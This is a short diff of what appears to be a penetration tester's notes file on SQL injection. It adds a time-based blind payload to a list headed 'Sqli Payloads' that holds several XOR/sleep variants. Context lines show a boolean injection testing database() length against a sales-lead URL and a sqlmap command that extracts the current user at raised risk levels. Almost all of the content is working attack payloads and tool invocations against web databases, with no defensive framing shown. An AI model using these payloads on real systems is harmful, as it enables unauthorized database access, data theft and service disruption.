@@ -21,6 +21,7 @@ saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc" AND (length(database())) = "11 -
 
 Sqli Payloads
 ```sql
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 "XOR(if(now()=sysdate(),sleep(12),0))XOR”Z
 "XOR(if(now()=sysdate(),sleep(1200),0))XOR”Z
 "XOR(if(now()=sysdate(),sleep(0),0))XOR”Z
@@ -43,5 +44,5 @@ sqlmap -p log -r request-cz.txt --current-user --level=2 --risk=2
 ```
 
 ```
-'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+
 ```
